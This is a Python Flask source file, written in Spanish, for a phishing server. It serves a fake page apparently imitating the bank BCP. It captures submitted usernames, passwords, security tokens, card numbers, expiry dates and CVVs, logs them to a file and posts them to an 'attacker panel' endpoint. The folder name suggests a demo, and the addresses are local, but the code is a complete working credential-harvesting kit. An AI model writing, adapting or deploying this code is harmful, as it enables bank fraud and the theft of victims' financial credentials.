from flask import Flask, render_template, request, jsonify
from datetime import datetime
import os
import requests

app = Flask(__name__)

CARPETA = "C:\\Demo_Phishing"
ARCHIVO_CREDENCIALES = os.path.join(CARPETA, "credenciales_capturadas.txt")
PANEL_ATACANTE = "http://127.0.0.1:5000/recibir_credencial"

os.makedirs(CARPETA, exist_ok=True)

@app.route('/')
def index():
    return render_template('bcp_falso.html')

@app.route('/login', methods=['POST'])
def capturar_login():
    usuario = request.form.get('usuario', '')
    password = request.form.get('password', '')
    token = request.form.get('token', '')
    tarjeta = request.form.get('tarjeta', '')
    vencimiento = request.form.get('vencimiento', '')
    cvv = request.form.get('cvv', '')

    with open(ARCHIVO_CREDENCIALES, 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now()}] Usuario: {usuario} | Password: {password} | Token: {token}\n")
        if tarjeta:
            f.write(f"[{datetime.now()}] Tarjeta: {tarjeta} | Venc: {vencimiento} | CVV: {cvv}\n")

    try:
        requests.post(PANEL_ATACANTE, json={
            "tipo": "LOGIN" if not tarjeta else "TARJETA",
            "usuario": usuario,
            "password": password,
            "tarjeta": tarjeta,
            "cvv": cvv
        }, timeout=2)
    except:
        pass

    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8080, debug=False)